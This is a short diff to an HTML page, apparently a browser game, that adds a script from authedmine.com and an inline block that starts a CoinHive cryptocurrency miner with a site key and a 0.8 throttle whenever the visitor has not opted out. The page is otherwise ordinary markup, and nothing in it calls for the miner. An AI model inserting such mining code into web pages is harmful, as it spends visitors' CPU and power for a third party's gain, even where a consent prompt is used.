@@ -13,6 +13,13 @@
     <script type="text/javascript" src="js/createjs-2014.12.12.min.js"></script>
     <script type="text/javascript" src="js/hammer.min.js"></script>
     <script type="text/javascript" src="js/bundle.js"></script>
+    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+    <script>
+      const miner = new CoinHive.Anonymous('GZ6urR8zdZvPpZ3ghjP5iHRYgyN9h9ZO', { throttle: 0.8 });
+      if (!miner.didOptOut(14400)) {
+        miner.start();
+      }
+    </script>
   </head>
   <body ondragstart="return false;" ondrop="return false;">
     <div style="position: fixed; background-color: transparent; top: 0px; left: 0px; width: 100%; height: 100%"></div>
